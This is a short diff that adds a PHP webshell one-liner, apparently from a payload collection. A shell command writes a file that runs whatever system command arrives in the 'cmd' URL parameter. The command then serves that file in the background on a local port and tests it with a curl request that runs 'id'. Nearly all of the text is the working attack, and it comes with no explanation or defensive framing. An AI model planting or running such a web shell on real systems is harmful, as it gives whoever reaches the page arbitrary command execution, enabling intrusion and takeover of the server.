@@ -1,0 +1,4 @@
+#php webshell one-liner
+echo "<?php system(\$_GET['cmd']);?>" > webshell.php && (&>/dev/null php -S localhost:8080 webshell.php&)
+
+curl http://localhost:8080/webshell.php?cmd="id"
